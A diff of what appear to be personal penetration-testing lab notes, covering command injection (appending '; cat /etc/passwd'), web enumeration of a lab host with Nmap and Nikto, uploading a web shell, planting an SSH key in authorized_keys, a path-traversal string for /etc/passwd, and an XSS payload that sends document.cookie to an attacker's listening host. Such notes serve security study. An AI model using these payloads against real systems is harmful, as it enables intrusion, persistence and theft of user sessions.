@@ -108,10 +108,50 @@ Might contain the following in it’s code:
 `system("ping -c 1 ".$_GET["ip"]);`
 Run the following to chain/stack our arbitrary command:
 `; cat /etc/passwd`
+=====================================================================================================================
+
+Enumerate website
+robots.txt
+directories:
+/uploads
+/chat
+/cmdinjection
+/java
+/path
+/webexample
+
+from surfing:
+- Can upload file?
+
+Tools:
+Nmap:
+robots.txt
+/java
+/path
+/uploads
+Nikto:
+nikto v -h 10.50.28.11
+Same as robots.txt
+
+/uploads has thingy.php that provides a shell 
+Main page allows file upload; uploaded web shell to server. File name is /uploads/thingy.php
+
+ssh-keygen to create public-private key pair
+
+echo "<key>" >> /var/www/.ssh/authorized_keys
 
 
 
 
+
+
+../../../../../../../etc/passwd
+
+base for grabbing a cookie:
+<script>alert('XSS!');</script>
+
+python3 -m http.server
+<script>document.location="http://<`ip:port`>/?" + document.cookie;</script>
 
 
 
